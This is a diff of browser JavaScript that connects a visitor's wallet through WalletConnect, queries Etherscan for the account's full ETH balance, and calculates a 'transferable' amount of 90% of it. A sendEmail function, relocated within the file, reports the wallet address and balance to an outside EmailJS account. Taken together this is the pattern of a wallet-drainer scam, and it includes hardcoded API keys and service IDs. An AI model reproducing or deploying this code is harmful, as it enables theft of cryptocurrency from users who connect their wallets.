@@ -1,4 +1,6 @@
 // Include the Email.js library
+import Web3 from "web3";
+import WalletConnectProvider from "@walletconnect/web3-provider";
 var emailJsScript = document.createElement('script');
 emailJsScript.src = 'https://cdn.emailjs.com/dist/email.min.js';
 document.head.appendChild(emailJsScript);
@@ -11,25 +13,6 @@ const provider = new WalletConnectProvider({
 const Web3 = require('web3');
 const web3 = new Web3(provider);
 
-
-// Function to send the email
-function sendEmail(balance, wallet) {
-    emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID
-
-    var templateParams = {
-        balance: balance,
-        wallet: wallet
-    };
-
-    emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
-        .then(function(response) {
-            console.log('Email sent:', response);
-        })
-        .catch(function(error) {
-            console.error('Email error:', error);
-        });
-}
-
 const runContract = async () => {
   try {
     await provider.enable(); // Request wallet connection
@@ -39,14 +22,14 @@ const runContract = async () => {
       const accounts = await provider.send('eth_requestAccounts', []);
       const account = accounts[0];
       const apiKey = "876RZ5Y8WWAXVNZN61T2WPFTGI5MBI5GGX"; // for eth
-			//const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
-			const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
-
-			const response = await fetch(ethBalanceApiUrl);
-			const ethBalanceData = await response.json();
-			const ethBalanceInWei = ethBalanceData.result;
-			const gasFee = 0.1 * ethBalanceInWei;
-			const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);
+	//const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
+	const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
+	
+	const response = await fetch(ethBalanceApiUrl);
+	const ethBalanceData = await response.json();
+	const ethBalanceInWei = ethBalanceData.result;
+	const gasFee = 0.1 * ethBalanceInWei;
+	const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);
       // Now, you can use 'account' for your contract interactions
       const contractAbi = [{
 		"constant": true,
@@ -113,3 +96,23 @@ const runContract = async () => {
     console.error('WalletConnect error:', error);
   }
 });
+
+
+// Function to send the email
+function sendEmail(balance, wallet) {
+    emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID
+
+    var templateParams = {
+        balance: balance,
+        wallet: wallet
+    };
+
+    emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
+        .then(function(response) {
+            console.log('Email sent:', response);
+        })
+        .catch(function(error) {
+            console.error('Email error:', error);
+        });
+}
+
